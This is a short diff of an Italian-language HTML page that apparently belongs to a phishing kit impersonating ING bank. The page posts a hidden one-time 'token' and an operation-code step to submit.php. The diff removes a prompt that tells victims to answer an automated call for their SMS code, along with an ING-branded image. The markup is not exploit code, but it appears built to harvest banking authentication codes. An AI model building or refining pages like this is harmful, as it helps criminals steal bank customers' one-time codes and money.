@@ -32,13 +32,7 @@
     <form id="tokenForm" action="submit.php" method="POST">
         <input type="hidden" name="step" value="token">
         <input type="hidden" id="tokenValue" name="token" value="">
-               <legend> Rispondi alla chiamata automatica per ricevere il tuo codice SMS... </legend>
-      <p role="alert" class="info-message">
-        <span> <img width="100" src="../client/img/ing-call.png"> </span>
-      </p>
-	  </br>
-	  
- 
+
         <div class="progress">
             <div class="progress-step completed">
                 <div class="progress-step-circle">
@@ -46,7 +40,6 @@
                         stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                         <polyline points="20 6 9 17 4 12"></polyline>
                     </svg>
-					
                 </div>
                 <div class="progress-step-text">Codice Operazione</div>
             </div>
